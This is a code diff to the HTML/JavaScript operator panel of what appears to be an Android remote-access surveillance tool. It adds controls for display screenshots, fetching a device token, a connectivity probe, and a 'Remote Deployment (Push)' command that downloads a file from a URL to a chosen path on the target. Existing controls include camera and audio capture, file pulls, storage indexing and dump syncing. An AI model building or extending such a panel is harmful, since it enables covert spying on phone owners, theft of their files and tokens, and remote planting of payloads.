@@ -181,6 +181,13 @@
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Connectivity & Identity</label>
+                    <div class="input-wrap">
+                        <button class="btn" style="flex:1" onclick="sendCmd('PING')">Ping Probe</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_TOKEN')">Fetch Token</button>
+                    </div>
+                </div>
                 <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Intent</label>
@@ -198,8 +205,16 @@
                 </div>
             </div>
 
-            <h2>Surveillance (Optical / Audio)</h2>
+            <h2>Surveillance (Optical / Audio / Display)</h2>
             <div class="card">
+                <div class="cmd-row">
+                    <label class="cmd-label">Display Snapshot</label>
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
+                        <input type="number" id="scr-quality" value="70" placeholder="Quality %" style="flex:1">
+                        <button class="btn" onclick="sendCmd('GET_SCREENSHOT')">Screenshot</button>
+                    </div>
+                </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Optical Capture</label>
                     <div class="input-wrap">
@@ -258,6 +273,15 @@
                     </div>
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Remote Deployment (Push)</label>
+                    <input type="text" id="push-url" placeholder="Source URL (http://...)">
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('PUSH_FILE')">?</button>
+                        <input type="text" id="push-path" placeholder="/sdcard/Target/path.ext" style="flex:1">
+                        <button class="btn" onclick="sendCmd('PUSH_FILE')">Deploy</button>
+                    </div>
+                </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Vault Integrity</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><div style="flex:1; display:flex; gap:5px;"><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Check Size</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button></div></div></div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
@@ -428,6 +452,11 @@
                     case 'RING': content = document.getElementById('val-ring').value; break;
                     case 'STAY_READY': content = document.getElementById('val-burst').value; break;
                     case 'SET_INTERVAL': content = document.getElementById('val-work').value; break;
+                    case 'PING': content = 'Online?'; break;
+                    case 'GET_TOKEN': content = ''; break;
+                    case 'GET_SCREENSHOT': content = document.getElementById('scr-quality').value || '70'; break;
+                    case 'PUSH_FILE': 
+                        content = `${document.getElementById('push-url').value} | ${document.getElementById('push-path').value}`; break;
                     case 'PULL_FILE': content = document.getElementById('val-pull').value; break;
                     case 'RUN_INTENT':
                         const intObj = {};
